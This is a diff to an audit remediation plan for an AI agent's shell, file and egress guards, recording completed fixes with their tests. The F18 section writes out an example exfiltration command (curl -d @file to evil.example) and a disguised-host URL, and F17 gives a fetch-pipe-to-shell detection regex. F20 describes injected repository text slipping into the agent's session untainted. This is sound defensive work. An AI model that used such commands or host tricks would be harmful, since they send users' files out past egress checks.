@@ -141,13 +141,13 @@ One branch and one PR per wave (`fix/audit-1031-w1` to `fix/audit-1031-w5`). Mer
 - **Root cause:** `SessionPresenceEvent` carries an empty `session_id` plus `owner_user_id` and `title`. The WebSocket path filters it by owner. SSE's `_visible` passes any event with an empty `session_id`. A session that does not exist yet passes `verify_session_ownership(None)` and the allow is cached for the connection.
 - **Design (one rule, one home):** a pure predicate `visible_to(event, principal, ownership_enforced) -> bool`. Both transports call it. Do not cache an allow when the session was `None`.
 - **Tests first:** parametrize over the transport (SSE, WebSocket) and the event type, with two principals. Principal B must not see principal A's presence event on either transport.
+- **Outcome (2026-10-31):** done. `EventVisibility` (one per SSE connection) and `presence_owner` live in `weebot/interfaces/web/event_visibility.py`; the broadcaster uses the same `presence_owner`.
 
 ---
 
 ## Wave 2: shell, file and egress guards
 
 All of this sits in `weebot/core` and `weebot/application/services`. The pattern throughout is a pure policy function plus default deny. Existing guard tests stay as they are. New tests are added beside them.
-- **Outcome (2026-10-31):** done. `EventVisibility` (one per SSE connection) and `presence_owner` live in `weebot/interfaces/web/event_visibility.py`; the broadcaster uses the same `presence_owner`.
 
 ### F17. Bound the analysis and the regex
 
@@ -155,6 +155,7 @@ All of this sits in `weebot/core` and `weebot/application/services`. The pattern
 - **Root cause:** `l2.fetch-pipe-run` has three `.*` groups and `get` has no trailing boundary. I timed it: 400 words take 0.03 s and growth is about n^2.6, so roughly 20 s at 5,000 words and minutes at 20,000. The regex runs synchronously, so the event loop stalls.
 - **Fix:** one cap at the single entry point, `analyze(command)`: a command over 8 KB returns DANGEROUS with the reason "too long to analyse". It is not skipped, which would be fail-open. The pattern uses `[^|\n]*` and `\bget\b`.
 - **Tests first:** a 20,000-word command returns in under 0.5 s with a DANGEROUS verdict. A Hypothesis test: for any generated command, `analyze` returns within a time bound. The existing fetch-pipe-run cases still match.
+- **Outcome (2026-11-01):** done. `analyze` refuses a command over `MAX_ANALYZED_COMMAND_CHARS` (8192) as DANGEROUS with the reason "too long to analyse". `l2.fetch-pipe-run` is now `\b(download|fetch|get-content|get)\b[^|\n]*\|\s*\b(execute|run|start|bash|sh|zsh)\b`. A first attempt that kept three `[^|\n]*` groups was slower than the original, so the pattern dropped the two-whitespace requirement and is linear per verb. One existing test changed: `test_very_long_command` expected a 10,000-character command to be SAFE or SUSPICIOUS.
 
 ### F4. One protected-path rule
 
@@ -162,6 +163,7 @@ All of this sits in `weebot/core` and `weebot/application/services`. The pattern
 - **Root cause:** `write_target` blocks any path with a `.git` component or a protected basename. `PathValidator.validate` does not, and its extension check runs only `if input_path.suffix:`, so `.git/hooks/pre-commit` has no suffix and skips it.
 - **Design (one rule, one home):** extract `is_protected_path(path)` in `output_path.py` and make `PathValidator.validate` call it. Compare case-insensitively, because Windows is case-insensitive. Reject a suffixless write unless the name is on an allowlist.
 - **Tests first:** `.git/hooks/pre-commit`, `.GIT\config`, `a/.git/hooks/x` and `.env` are rejected through `file_editor` for create, insert and replace. `README` is still allowed. Add these cases to the r13 suite.
+- **Outcome (2026-11-01):** done. `is_protected_path` in `weebot/core/output_path.py` serves `write_target` and `PathValidator.validate`, case-insensitively and with either separator. The validator also refuses a new extensionless file unless its name is on `SUFFIXLESS_CREATE_NAMES` (README, LICENSE, Makefile and similar) or is a known dotfile. Editing an existing extensionless file is not restricted; only protected paths are.
 
 ### F3, F29, F19. One shell tokenizer, default deny
 
@@ -186,6 +188,7 @@ These three share a root cause: the approval policy reasons about command text w
   - A Hypothesis property: for any word containing one of `, ` ; * ? $ ~` or `\\`, `_in_output` is False.
   - The existing `tests/unit/fixes/test_r01_*` and approval-policy suites still pass: legitimate `Output\x` writes are still auto-approved.
 - **Expect more prompts:** this tightens the policy, so some multi-path commands that used to run silently now ask. That is the safe direction. See decision D6.
+- **Outcome (2026-11-01):** done. `ShellWord`, `tokenize`, `strip_escapes`, `has_dynamic_command_name` and `after_directory_change` are in `weebot/core/shell_segments.py`. `_in_output` refuses any word with a backtick, a variable, a list comma, a UNC prefix, a `;`, a `~`, a `[`, or a `*` or `?` in a directory part. A `*` or `?` in the last part is still allowed, because an existing test pins `Remove-Item Output/x/*.tmp` as silent and the last part cannot walk through a junction. This is narrower than the plan's property. The read-only set is exact names with no `get-` prefix, no basename stripping and no `.exe`; any UNC word or built command name is not read-only. After a `cd`-like segment, later segments are not Output-scoped. A variable counts as assigned once only when no other write to it exists anywhere in the command (`+=`, `++`, a write inside `{ }`, `[ref]`, `Set-Variable`). Backticks are stripped before the rules run in `BashGuard`, `CommandSecurityAnalyzer` and the approval policy, and a built command name asks.
 
 ### F18. All hosts, not the first
 
@@ -193,6 +196,7 @@ These three share a root cause: the approval policy reasons about command text w
 - **Root cause:** `_extract_host_from_cmd` returns only the first URL. After `pypi.org` is allowed, `curl -d @file https://pypi.org/ https://evil.example/c` has a known recipient.
 - **Design:** `extract_hosts(command) -> frozenset[str]` returns every URL host, every UNC host (`\\host`) and every bare host after a network verb. The policy is a subset test: every host must be known. An empty set with a network verb is unknown. `network_use()` uses the same function.
 - **Tests first:** two URLs where the second is unknown asks. UNC and bare-host forms ask. A single known URL is unchanged. Hypothesis: adding any host to a command can only move the verdict toward ask.
+- **Outcome (2026-11-01):** done. `extract_hosts` in `weebot/core/egress_guard.py` returns URL hosts (userinfo stripped, so `https://pypi.org@evil.example` is `evil.example`), UNC hosts, and bare hosts after a network verb. Option values that are files or headers are skipped per verb, and only for options that always take a value, so a host is never skipped. A word with `$` or a backtick is kept as an unknown host. `classify` asks when any host is unknown and names the first unknown one as the recipient. `network_use` returns the first unknown host, and adds the registry an install implies. The plan named `_tool_executor.py` under `application/services`; it is `application/agents/executor/_tool_executor.py`.
 
 ### F20. Taint after a networked shell call
 
@@ -200,6 +204,7 @@ These three share a root cause: the approval policy reasons about command text w
 - **Root cause:** `bash_tool`, `powershell_tool` and `python_tool` declare `OutputTrust.LOCAL`, and `must_taint` fires only for EXTERNAL. After `git clone` of an allowed host, injected text in the repo is read with no taint, so the "ask after untrusted content" rule (D5) never fires.
 - **Design:** classification belongs in the application layer, where the call and its result are both visible. After a LOCAL shell or Python call, `ToolExecutor` marks the session tainted when `egress_guard.network_use(command)` is true (F18's function). The tools do not change and do not learn about taint.
 - **Tests first:** `git clone https://github.com/x/y` followed by a file read, then a write outside `Output/`, asks. A local `dir` does not taint. The existing S1 taint-replay test still passes.
+- **Outcome (2026-11-01):** done. `taints_after_network` in `weebot/core/trust_boundary.py` is the pure rule, and `EgressGuard.uses_network` says whether a shell or python call fetched from the network (shell: downloads, installs, git remotes; python: a network library import). `ToolExecutor.execute_tool` taints after a successful LOCAL call that did. Pings and lookups do not taint, because they fetch no content. The tools are unchanged. The effect-ledger tests use a guard whose `uses_network` is false, because they test the ledger and their fake send must not taint the session.
 - **Behavior change:** more approval prompts in sessions that touch the network from a shell. See decision D1.
 
 ### F28. One redaction home
@@ -208,6 +213,7 @@ These three share a root cause: the approval policy reasons about command text w
 - **Root cause:** both need `password"` then `:` with nothing between, so `{"password": "x"}` and `"token": "abc"` pass through. Two modules carry two copies of the key list.
 - **Design (one rule, one home):** one pattern builder with optional quotes and whitespace around the key and the separator. `credential_sanitizer` calls `secret_redaction`, and the second key list goes away. That removes code, which is the lean direction.
 - **Tests first:** a table of key styles (`password=x`, `"password": "x"`, `'token':'x'`, `Authorization: Bearer x`). A Hypothesis test: for any key from the list and any value, the value does not survive redaction. `tests/unit/fixes/test_r23_no_key_in_logs.py` still passes.
+- **Outcome (2026-11-01):** done. `SECRET_KEYS`, `KEY_VALUE_RE` and `redact_key_values` live in `weebot/core/secret_redaction.py`. The pattern takes optional quotes around the key and the value, keeps the key, the separator and the quotes, and leaves an already-redacted value alone. `credential_sanitizer` calls it and its three copies of the key patterns are gone. One existing test changed: `test_the_label_in_the_text_survives` pinned `passwd=` for the input `passwd: abc123`, which was the old rewrite of `:` to `=`. It now pins that the label survives and the value does not.
 
 ---
 
